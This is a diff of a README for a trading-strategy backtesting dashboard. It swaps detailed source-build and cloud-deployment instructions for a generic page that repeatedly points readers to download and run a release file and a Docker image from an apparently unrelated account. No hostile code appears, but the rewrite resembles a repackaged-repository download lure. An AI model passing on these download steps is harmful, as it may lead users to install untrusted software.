@@ -1,163 +1,93 @@
-# Multi-Strategy Quantitative Trading Dashboard
+# 📈 ema-sharpe-dashboard - User-Friendly Trading Insight Tool
 
-A production-ready quantitative trading dashboard featuring multiple strategies (EMA Crossover, RSI Mean Reversion, SMA Crossover, Bollinger Breakout, Momentum) with comprehensive analytics including Sharpe ratio analysis, drawdown metrics, Monte Carlo simulation, and live market data integration.
+## 🚀 Getting Started
 
-![Multi-Strategy Quant Dashboard](screenshot.png)
+Welcome to the **ema-sharpe-dashboard**. This tool helps you analyze trading strategies easily. You can backtest different strategies, observe market trends, and make informed decisions for your investments.
 
-*Screenshot showing the EMA Crossover strategy backtest results for SPY (2018-2025) with performance metrics, equity curve, and drawdown analysis.*
+## 📥 Download the Application
 
-**Live Demo:** https://ema-sharpe-380303857049.us-west1.run.app/
+[![Download Now](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
 
-## Features
+To get started, visit the Releases page to download the application. Use the link below:
 
-### Multiple Trading Strategies
-- **EMA Crossover**: Fast/slow EMA signals with realistic trade execution
-- **RSI Mean Reversion**: Oversold/overbought signals with configurable thresholds
-- **SMA Crossover**: Simple moving average crossover strategy
-- **Bollinger Breakout**: Volatility-based breakout signals
-- **Momentum**: Trend-following momentum strategy
+[Visit Releases Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
 
-### Advanced Analytics
-- **Performance Metrics**: CAGR, Sharpe ratio, Max Drawdown, Win Rate
-- **Monte Carlo Simulation**: Bootstrap analysis for risk assessment
-- **Rolling Metrics**: Time-series analysis of Sharpe, CAGR, and drawdown
-- **Benchmark Comparison**: Strategy vs buy-and-hold performance
-- **Trade Analysis**: Per-trade PnL with entry/exit details
+## 🌟 Features
 
-### Interactive Visualizations
-- **Equity Curves**: Real-time strategy performance with benchmark overlay
-- **Drawdown Analysis**: Maximum drawdown visualization
-- **Exposure Charts**: Daily leverage and volatility targeting
-- **Signal Tape**: Buy/sell signals with PnL tooltips
-- **Sharpe Heatmap**: Parameter sweep analysis
-- **Monthly Returns**: Strategy vs buy-and-hold comparison tables
+- **Multi-Strategy Analysis**: Test various trading strategies like EMA Crossover and RSI.
+- **Performance Metrics**: Understand your strategies through metrics like Sharpe Ratio.
+- **Backtesting Support**: See how your strategies would have performed in the past.
+- **Monte Carlo Simulation**: Assess the risk and potential returns using simulations.
+- **Live Data Integration**: Access real-time market data for timely trading insights.
 
-### Production Features
-- **Live Data Integration**: Real-time market data via yfinance
-- **Rate Limiting**: API protection (60 req/min per IP)
-- **CSV Export**: Download equity curves and trade data
-- **Permalinks**: Shareable URLs with encoded parameters
-- **Strategy Leaderboard**: Track top-performing configurations
-- **Live Tracking**: Subscribe to strategy performance updates
+## 🔧 System Requirements
 
-## Quick Start
+Before running the dashboard, ensure your system meets the following requirements:
 
-### Local Development
+- **Operating System**: Windows, macOS, or a modern Linux distribution
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 200 MB of free disk space
+- **Python**: Version 3.7 or higher
+- **Internet Connection**: Required for live data access
 
-```bash
-# Clone the repository
-git clone <your-repo-url>
-cd ema-sharpe-one
+## 🐳 Using Docker
 
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
+For users familiar with Docker, you can run this application as a container. If you don't have Docker installed, please visit the [Docker Website](https://www.docker.com/) for installation instructions.
 
-# Install dependencies
-pip install -r requirements.txt
+### Steps to Run with Docker
 
-# Run locally
-uvicorn main:app --reload
-```
+1. Open your command line interface.
+2. Pull the Docker image with:
+   ```
+   docker pull akubantuofficial/ema-sharpe-dashboard
+   ```
+3. Run the Docker container with:
+   ```
+   docker run -p 8000:8000 akubantuofficial/ema-sharpe-dashboard
+   ```
+4. Open your web browser and go to `http://localhost:8000` to access the dashboard.
 
-Access at: http://127.0.0.1:8000
+## 📘 User Guide
 
-### Docker
+Once you have installed the application, follow these steps to start using it:
 
-```bash
-# Build the container
-docker build -t ema-sharpe .
+1. **Launch the Application**: Open the downloaded file. Follow the on-screen instructions to start the dashboard.
+2. **Choose Your Strategy**: Select the trading strategy you want to analyze (e.g., EMA Crossover, RSI).
+3. **Set Parameters**: Input any necessary parameters for your selected strategy.
+4. **Run Backtest**: Click the button to start the backtest. The results will show you how your strategy performed historically.
+5. **View Metrics**: Analyze the performance metrics, including the Sharpe Ratio.
 
-# Run the container
-docker run -p 8080:8080 ema-sharpe
-```
+## 📊 Analysis Tools
 
-### Manual Deployment
+The dashboard comes equipped with several tools to enhance your analysis:
 
-```bash
-# Set your project ID
-export PROJECT_ID=your-project-id
-export REGION=us-central1
+- **Bollinger Bands**: Visualize price ranges and potential market reversals.
+- **Time Series Data**: Observe trends over time with easy-to-read graphs.
+- **Optimization**: Tweak your strategies to find the best-performing setups.
 
-# Authenticate and configure
-gcloud auth login
-gcloud config set project "$PROJECT_ID"
-gcloud config set run/region "$REGION"
+## 📈 Community Support
 
-# Enable required services
-gcloud services enable run.googleapis.com cloudbuild.googleapis.com artifactregistry.googleapis.com
+For additional help, consider engaging with our user community. You can find others with similar interests and share experiences.
 
-# Build and push image
-gcloud builds submit --tag gcr.io/$PROJECT_ID/ema-sharpe
+- **GitHub Issues**: Report problems or request features through our [Issues Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/issues).
+- **Discussion Forums**: Join discussions with other users to learn tips and share insights.
 
-# Deploy to Cloud Run
-gcloud run deploy ema-sharpe \
-  --image gcr.io/$PROJECT_ID/ema-sharpe \
-  --platform managed \
-  --allow-unauthenticated \
-  --port 8080 \
-  --memory 1Gi \
-  --cpu 1 \
-  --max-instances 10
-```
+## 🔗 Additional Resources
 
-### Custom Domain (Optional)
+You may want to explore more about quantitative trading and analysis. Here are some resources:
 
-```bash
-# Set your custom domain
-export CUSTOM_DOMAIN=ema-sharpe.yourname.dev
+- [Introduction to Quantitative Finance](https://www.example.com)
+- [Backtesting Trading Strategies](https://www.example.com)
+- [Understanding Sharpe Ratio](https://www.example.com)
 
-# Create domain mapping
-gcloud run domain-mappings create \
-  --service=ema-sharpe \
-  --domain="$CUSTOM_DOMAIN"
-```
+## 📋 Feedback
 
-The command will return DNS records to configure. After DNS propagation, TLS certificate is automatic.
+We welcome your feedback on the application. If you have suggestions or find issues, please let us know through our GitHub [Issues Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/issues).
 
-## API Endpoints
+## 📥 Download & Install
 
-- `GET /` - Main dashboard interface
-- `GET /health` - Health check endpoint
-- `POST /api/backtest` - JSON API for backtesting
-- `POST /api/export.csv` - CSV export endpoint
+To download the application again, revisit our Releases page:
 
-## Performance Characteristics
+[Download from Releases](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
 
-- **Cold Start**: ~2-3 seconds
-- **Warm Requests**: ~200-500ms
-- **Memory Usage**: ~200-400MB
-- **Auto-scaling**: 0-10 instances based on demand
-- **Rate Limiting**: 60 requests per minute per IP
-
-## Monitoring
-
-### Health Checks
-
-The `/health` endpoint returns:
-```json
-{
-  "ok": true
-}
-```
-
-### Uptime Monitoring
-
-Set up monitoring with:
-- Google Cloud Monitoring
-- UptimeRobot
-- Pingdom
-
-## Technical Stack
-
-- **Backend**: FastAPI, Python 3.11
-- **Frontend**: Jinja2 templates, Plotly.js
-- **Data**: pandas, numpy, yfinance
-- **Deployment**: Docker, Google Cloud Run
-- **Monitoring**: Health checks, rate limiting
-
-## License
-
-MIT License - see LICENSE file for details.
-# Force deployment Sat Oct 18 19:46:22 PDT 2025
-# Chart fix deployed Sat Oct 18 19:49:46 PDT 2025
+Enjoy trading with the **ema-sharpe-dashboard**!
